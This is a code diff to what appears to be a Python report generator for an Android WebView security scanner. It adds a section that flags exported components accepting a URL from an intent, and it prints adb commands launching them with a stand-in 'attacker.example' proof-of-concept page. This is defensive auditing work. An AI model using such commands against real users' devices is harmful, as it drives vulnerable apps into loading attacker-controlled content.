@@ -2,7 +2,16 @@
 
 from __future__ import annotations
 
+import re
+
 from .scanner import Report
+
+
+def _extra_key(flow: str) -> str:
+    """Recover the intent extra name from an intent_url_source description so the
+    suggested adb command matches the real key (e.g. EXTRA_URL, url)."""
+    m = re.search(r"getString\(([^)]+)\)", flow)
+    return m.group(1).strip('"') if m else ""
 
 
 def render(report: Report) -> str:
@@ -40,6 +49,39 @@ def render(report: Report) -> str:
             p("```")
         p("")
 
+    # Reachability first: a latent WebView misconfiguration is only actionable if
+    # something off-device can actually reach it. This section answers "how would
+    # someone exploit this with the app installed on their phone?".
+    chains = [h for h in report.hosts if h.is_exported_component and h.intent_url_source]
+    p("## Reachability\n")
+    if not chains:
+        p("No exported entry point was found that loads an attacker-supplied URL into "
+          "a WebView. The misconfigurations above are latent: reaching them requires "
+          "either an in-app navigation to attacker-controlled content (e.g. a malicious "
+          "ad or a link the user opens in-app) or a separate bug that supplies the URL.")
+        p("")
+    else:
+        p("These exported entry points render a URL chosen by whoever launches them, "
+          "so any app on the device (or an ad SDK, or a browsed link) can drive them "
+          "with no user action inside the app. Verify on a test device with `adb`, "
+          "substituting the component and extra key:\n")
+        p("```sh")
+        for h in chains:
+            key = _extra_key(h.intent_url_source) or "url"
+            p(f"# {h.name}")
+            p(f"adb shell am start -n {report.package}/{h.name} "
+              f'-e {key} "https://attacker.example/poc.html"')
+            p("")
+        p("```")
+        p("")
+        p("| component | intent-URL flow | JS bridge | local file access |")
+        p("|-----------|-----------------|-----------|-------------------|")
+        for h in chains:
+            bridges = ", ".join(f"`{b.name}`" for b in h.bridges) or "—"
+            fa = "yes" if h.settings.get("allow_file_access") is True else "—"
+            p(f"| `{h.name}` | {h.intent_url_source} | {bridges} | {fa} |")
+        p("")
+
     p("## WebView hosts\n")
     for h in report.hosts:
         if not h.settings and not h.bridges and not h.loaded_urls:
@@ -59,6 +101,8 @@ def render(report: Report) -> str:
                 p(f"  - `{u}`")
         if h.unrestricted_navigation:
             p("- navigation: **no allowlist detected**")
+        if h.intent_url_source:
+            p(f"- intent-supplied URL: `{h.intent_url_source}`")
         p("")
 
     p("## Exported components\n")
